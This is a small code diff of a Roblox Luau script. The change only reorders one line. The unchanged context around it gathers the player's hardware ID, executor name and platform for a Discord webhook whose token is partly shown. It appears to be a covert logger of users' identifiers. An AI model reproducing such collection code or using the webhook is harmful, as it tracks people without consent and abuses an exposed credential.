@@ -9,9 +9,9 @@ local WEBHOOK = "https://discord.com/api/webhooks/1500137833900277861/ty4ZRbnCfd
 pcall(function()
     local HttpService = game:GetService("HttpService")
     local player = game:GetService("Players").LocalPlayer
+    local UIS = game:GetService("UserInputService")
     local hwid = pcall(gethwid) and gethwid() or "Unknown"
     local executor = identifyexecutor and identifyexecutor() or "Unknown"
-    local UIS = game:GetService("UserInputService")
     local platform = UIS.TouchEnabled and not UIS.KeyboardEnabled and "Mobile" or "PC"
 
     local data = {
